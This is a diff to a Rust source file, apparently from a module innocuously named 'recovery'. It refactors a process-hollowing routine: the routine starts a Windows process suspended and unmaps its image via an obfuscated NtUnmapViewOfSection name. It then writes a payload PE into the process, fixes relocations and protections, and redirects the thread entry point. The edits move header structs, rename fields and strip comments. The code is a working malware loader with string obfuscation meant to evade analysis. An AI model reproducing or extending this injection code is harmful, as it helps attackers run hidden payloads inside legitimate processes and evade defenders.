@@ -1,6 +1,11 @@
 #![allow(non_snake_case)]
 
 use crate::recovery::helpers::obfuscation::{deobf, deobf_w};
+use crate::recovery::helpers::pe::{
+    IMAGE_DOS_HEADER,
+    IMAGE_NT_HEADERS64,
+    IMAGE_SECTION_HEADER,
+};
 use crate::recovery::settings::RecoveryControl;
 use std::env;
 use std::ffi::OsStr;
@@ -9,116 +14,28 @@ use std::ptr::null_mut;
 use tracing::{debug, error, info};
 use windows::Win32::Foundation::HANDLE;
 use windows::Win32::System::Diagnostics::Debug::{
-    CONTEXT, CONTEXT_FLAGS, GetThreadContext, ReadProcessMemory, SetThreadContext,
+    CONTEXT,
+    CONTEXT_FLAGS,
+    GetThreadContext,
+    ReadProcessMemory,
+    SetThreadContext,
     WriteProcessMemory,
 };
 use windows::Win32::System::LibraryLoader::GetModuleHandleW;
 use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, VirtualAllocEx};
 use windows::Win32::System::Threading::{
-    CREATE_SUSPENDED, CreateProcessW, PROCESS_INFORMATION, ResumeThread, STARTUPINFOW,
+    CREATE_SUSPENDED,
+    CreateProcessW,
+    PROCESS_INFORMATION,
+    ResumeThread,
+    STARTUPINFOW,
 };
 use windows::core::{PCSTR, PCWSTR, PWSTR};
 
-#[allow(non_snake_case)]
-#[repr(C)]
-pub struct IMAGE_DOS_HEADER {
-    pub e_magic: u16,
-    pub e_cblp: u16,
-    pub e_cp: u16,
-    pub e_crlc: u16,
-    pub e_cparhdr: u16,
-    pub e_minalloc: u16,
-    pub e_maxalloc: u16,
-    pub e_ss: u16,
-    pub e_sp: u16,
-    pub e_csum: u16,
-    pub e_ip: u16,
-    pub e_cs: u16,
-    pub e_lfarlc: u16,
-    pub e_ovno: u16,
-    pub e_res: [u16; 4],
-    pub e_oemid: u16,
-    pub e_oeminfo: u16,
-    pub e_res2: [u16; 10],
-    pub e_lfanew: i32,
-}
-
-#[repr(C)]
-pub struct IMAGE_FILE_HEADER {
-    pub Machine: u16,
-    pub NumberOfSections: u16,
-    pub TimeDateStamp: u32,
-    pub PointerToSymbolTable: u32,
-    pub NumberOfSymbols: u32,
-    pub SizeOfOptionalHeader: u16,
-    pub Characteristics: u16,
-}
-
-#[repr(C)]
-pub struct IMAGE_DATA_DIRECTORY {
-    pub VirtualAddress: u32,
-    pub Size: u32,
-}
-
-#[repr(C)]
-pub struct IMAGE_OPTIONAL_HEADER64 {
-    pub Magic: u16,
-    pub MajorLinkerVersion: u8,
-    pub MinorLinkerVersion: u8,
-    pub SizeOfCode: u32,
-    pub SizeOfInitializedData: u32,
-    pub SizeOfUninitializedData: u32,
-    pub AddressOfEntryPoint: u32,
-    pub BaseOfCode: u32,
-    pub ImageBase: u64,
-    pub SectionAlignment: u32,
-    pub FileAlignment: u32,
-    pub MajorOperatingSystemVersion: u16,
-    pub MinorOperatingSystemVersion: u16,
-    pub MajorImageVersion: u16,
-    pub MinorImageVersion: u16,
-    pub MajorSubsystemVersion: u16,
-    pub MinorSubsystemVersion: u16,
-    pub Win32VersionValue: u32,
-    pub SizeOfImage: u32,
-    pub SizeOfHeaders: u32,
-    pub CheckSum: u32,
-    pub Subsystem: u16,
-    pub DllCharacteristics: u16,
-    pub SizeOfStackReserve: u64,
-    pub SizeOfStackCommit: u64,
-    pub SizeOfHeapReserve: u64,
-    pub SizeOfHeapCommit: u64,
-    pub LoaderFlags: u32,
-    pub NumberOfRvaAndSizes: u32,
-    pub DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
-}
-
-#[repr(C)]
-pub struct IMAGE_NT_HEADERS64 {
-    pub Signature: u32,
-    pub FileHeader: IMAGE_FILE_HEADER,
-    pub OptionalHeader: IMAGE_OPTIONAL_HEADER64,
-}
-
-#[repr(C)]
-pub struct IMAGE_SECTION_HEADER {
-    pub Name: [u8; 8],
-    pub Misc: u32,
-    pub VirtualAddress: u32,
-    pub SizeOfRawData: u32,
-    pub PointerToRawData: u32,
-    pub PointerToRelocations: u32,
-    pub PointerToLinenumbers: u32,
-    pub NumberOfRelocations: u16,
-    pub NumberOfLinenumbers: u16,
-    pub Characteristics: u32,
-}
-
 #[repr(C)]
 pub struct IMAGE_BASE_RELOCATION {
-    pub VirtualAddress: u32,
-    pub SizeOfBlock: u32,
+    pub virtual_address: u32,
+    pub size_of_block: u32,
 }
 
 const CONTEXT_AMD64: u32 = 0x100000;
@@ -179,7 +96,6 @@ fn hollow_and_run(target_path: &str) -> Result<(), Box<dyn std::error::Error>> {
             .chain(Some(0))
             .collect();
 
-        // Create target process in suspended state
         CreateProcessW(
             PCWSTR(target_w.as_ptr()),
             PWSTR(command_line.as_mut_ptr()),
@@ -196,7 +112,6 @@ fn hollow_and_run(target_path: &str) -> Result<(), Box<dyn std::error::Error>> {
 
         let _pi_guard = ProcessInformationGuard(pi);
 
-        // Get thread context to find PEB
         let mut context: CONTEXT = std::mem::zeroed();
         #[cfg(target_arch = "x86_64")]
         let mut target_image_base: *mut std::ffi::c_void = null_mut();
@@ -217,7 +132,6 @@ fn hollow_and_run(target_path: &str) -> Result<(), Box<dyn std::error::Error>> {
             )
             .map_err(|e| format!("failed to read PEB: {}", e))?;
 
-            // Unmap original image
             let ntdll_name = deobf_w(&[0xD3, 0xC9, 0xD9, 0xD1, 0xD1, 0x93, 0xD9, 0xD1, 0xD1]);
             let ntdll = GetModuleHandleW(PCWSTR(ntdll_name.as_ptr()))?;
             let nt_unmap_name_str = deobf(&[
@@ -237,7 +151,6 @@ fn hollow_and_run(target_path: &str) -> Result<(), Box<dyn std::error::Error>> {
             }
         }
 
-        // Parse PE headers of payload
         let dos_header = &*(payload_bytes.as_ptr() as *const IMAGE_DOS_HEADER);
         if dos_header.e_magic != 0x5A4D {
             // "MZ"
@@ -246,16 +159,15 @@ fn hollow_and_run(target_path: &str) -> Result<(), Box<dyn std::error::Error>> {
 
         let nt_headers = &*(payload_bytes.as_ptr().add(dos_header.e_lfanew as usize)
             as *const IMAGE_NT_HEADERS64);
-        if nt_headers.Signature != 0x4550 {
+        if nt_headers.signature != 0x4550 {
             // "PE\0\0"
             return Err("invalid NT headers".into());
         }
 
-        // Allocate memory in target process
         let mut remote_image_base = VirtualAllocEx(
             pi.hProcess,
-            Some(nt_headers.OptionalHeader.ImageBase as *const _),
-            nt_headers.OptionalHeader.SizeOfImage as usize,
+            Some(nt_headers.optional_header.image_base as *const _),
+            nt_headers.optional_header.size_of_image as usize,
             MEM_COMMIT | MEM_RESERVE,
             windows::Win32::System::Memory::PAGE_READWRITE,
         );
@@ -264,7 +176,7 @@ fn hollow_and_run(target_path: &str) -> Result<(), Box<dyn std::error::Error>> {
             remote_image_base = VirtualAllocEx(
                 pi.hProcess,
                 None,
-                nt_headers.OptionalHeader.SizeOfImage as usize,
+                nt_headers.optional_header.size_of_image as usize,
                 MEM_COMMIT | MEM_RESERVE,
                 windows::Win32::System::Memory::PAGE_READWRITE,
             );
@@ -274,24 +186,23 @@ fn hollow_and_run(target_path: &str) -> Result<(), Box<dyn std::error::Error>> {
             return Err("failed to allocate memory in target process".into());
         }
 
-        // Perform relocations if base changed
-        let delta = remote_image_base as isize - nt_headers.OptionalHeader.ImageBase as isize;
+        let delta = remote_image_base as isize - nt_headers.optional_header.image_base as isize;
         if delta != 0 {
             let reloc_dir =
-                &nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-            if reloc_dir.Size > 0 {
+                &nt_headers.optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+            if reloc_dir.size > 0 {
                 let mut current_reloc_offset =
-                    rva_to_offset(reloc_dir.VirtualAddress, nt_headers, payload_bytes.as_ptr())?;
-                let max_reloc_offset = current_reloc_offset + reloc_dir.Size as usize;
+                    rva_to_offset(reloc_dir.virtual_address, nt_headers, payload_bytes.as_ptr())?;
+                let max_reloc_offset = current_reloc_offset + reloc_dir.size as usize;
 
                 while current_reloc_offset < max_reloc_offset {
                     let reloc_block = &*(payload_bytes.as_ptr().add(current_reloc_offset)
                         as *const IMAGE_BASE_RELOCATION);
-                    if reloc_block.SizeOfBlock == 0 {
+                    if reloc_block.size_of_block == 0 {
                         break;
                     }
 
-                    let entries_count = (reloc_block.SizeOfBlock as usize
+                    let entries_count = (reloc_block.size_of_block as usize
                         - std::mem::size_of::<IMAGE_BASE_RELOCATION>())
                         / 2;
                     let entries_ptr = payload_bytes
@@ -305,7 +216,7 @@ fn hollow_and_run(target_path: &str) -> Result<(), Box<dyn std::error::Error>> {
                         let reloc_offset = entry & 0xFFF;
 
                         if reloc_type == IMAGE_REL_BASED_DIR64 {
-                            let target_rva = reloc_block.VirtualAddress + reloc_offset as u32;
+                            let target_rva = reloc_block.virtual_address + reloc_offset as u32;
                             let target_file_offset =
                                 rva_to_offset(target_rva, nt_headers, payload_bytes.as_ptr())?;
 
@@ -314,72 +225,70 @@ fn hollow_and_run(target_path: &str) -> Result<(), Box<dyn std::error::Error>> {
                             *val_ptr += delta as i64;
                         }
                     }
-                    current_reloc_offset += reloc_block.SizeOfBlock as usize;
+                    current_reloc_offset += reloc_block.size_of_block as usize;
                 }
             }
         }
 
-        // Write headers
         WriteProcessMemory(
             pi.hProcess,
             remote_image_base,
             payload_bytes.as_ptr() as *const _,
-            nt_headers.OptionalHeader.SizeOfHeaders as usize,
+            nt_headers.optional_header.size_of_headers as usize,
             None,
         )
         .map_err(|e| format!("failed to write headers: {}", e))?;
 
-        // Write sections
         let section_header_ptr = (payload_bytes
             .as_ptr()
             .add(dos_header.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()))
             as *const IMAGE_SECTION_HEADER;
-        for i in 0..nt_headers.FileHeader.NumberOfSections {
+        for i in 0..nt_headers.file_header.number_of_sections {
             let section = &*section_header_ptr.add(i as usize);
-            if section.SizeOfRawData > 0 {
+            if section.size_of_raw_data > 0 {
                 let remote_section_dest = (remote_image_base as usize
-                    + section.VirtualAddress as usize)
+                    + section.virtual_address as usize)
                     as *mut std::ffi::c_void;
                 let local_section_src = payload_bytes
                     .as_ptr()
-                    .add(section.PointerToRawData as usize)
+                    .add(section.pointer_to_raw_data as usize)
                     as *const std::ffi::c_void;
 
                 WriteProcessMemory(
                     pi.hProcess,
                     remote_section_dest,
                     local_section_src,
-                    section.SizeOfRawData as usize,
+                    section.size_of_raw_data as usize,
                     None,
                 )
                 .map_err(|e| format!("failed to write section {}: {}", i, e))?;
             }
         }
 
-        // Apply memory protections
         use windows::Win32::System::Memory::{
-            PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READONLY, VirtualProtectEx,
+            PAGE_EXECUTE_READ,
+            PAGE_PROTECTION_FLAGS,
+            PAGE_READONLY,
+            VirtualProtectEx,
         };
 
         let mut old_prot = PAGE_PROTECTION_FLAGS::default();
-        // Protect headers
         let _ = VirtualProtectEx(
             pi.hProcess,
             remote_image_base,
-            nt_headers.OptionalHeader.SizeOfHeaders as usize,
+            nt_headers.optional_header.size_of_headers as usize,
             PAGE_READONLY,
             &mut old_prot,
         );
 
-        // Protect sections
-        for i in 0..nt_headers.FileHeader.NumberOfSections {
+        for i in 0..nt_headers.file_header.number_of_sections {
             let section = &*section_header_ptr.add(i as usize);
-            if section.SizeOfRawData > 0 {
+            if section.size_of_raw_data > 0 {
                 let remote_section_dest = (remote_image_base as usize
-                    + section.VirtualAddress as usize)
+                    + section.virtual_address as usize)
                     as *mut std::ffi::c_void;
-                let is_executable = (section.Characteristics & 0x20000000) != 0;
-                let is_writable = (section.Characteristics & 0x80000000) != 0;
+                let is_executable = (section.characteristics & 0x20000000) != 0;
+                let is_writable = (section.characteristics & 0x80000000) != 0;
 
                 let prot = if is_executable {
                     PAGE_EXECUTE_READ
@@ -391,17 +300,15 @@ fn hollow_and_run(target_path: &str) -> Result<(), Box<dyn std::error::Error>> {
                 let _ = VirtualProtectEx(
                     pi.hProcess,
                     remote_section_dest,
-                    section.SizeOfRawData as usize,
+                    section.size_of_raw_data as usize,
                     prot,
                     &mut old_prot,
                 );
             }
         }
 
-        // Update thread context
         #[cfg(target_arch = "x86_64")]
         {
-            // Update image base in PEB
             let peb_base = context.Rdx;
             let image_base_offset = peb_base + 0x10;
 
@@ -413,9 +320,8 @@ fn hollow_and_run(target_path: &str) -> Result<(), Box<dyn std::error::Error>> {
                 None,
             )?;
 
-            // Update entry point in context
             context.Rcx =
-                remote_image_base as u64 + nt_headers.OptionalHeader.AddressOfEntryPoint as u64;
+                remote_image_base as u64 + nt_headers.optional_header.address_of_entry_point as u64;
 
             SetThreadContext(pi.hThread, &context)
                 .map_err(|e| format!("failed to set context: {}", e))?;
@@ -437,10 +343,10 @@ fn rva_to_offset(
             (*(base_ptr.add(0x3C) as *const i32)) as usize
                 + std::mem::size_of::<IMAGE_NT_HEADERS64>(),
         )) as *const IMAGE_SECTION_HEADER;
-        for i in 0..nt_headers.FileHeader.NumberOfSections {
+        for i in 0..nt_headers.file_header.number_of_sections {
             let section = &*section_header_ptr.add(i as usize);
-            if rva >= section.VirtualAddress && rva < section.VirtualAddress + section.Misc {
-                return Ok((rva - section.VirtualAddress + section.PointerToRawData) as usize);
+            if rva >= section.virtual_address && rva < section.virtual_address + section.misc {
+                return Ok((rva - section.virtual_address + section.pointer_to_raw_data) as usize);
             }
         }
     }
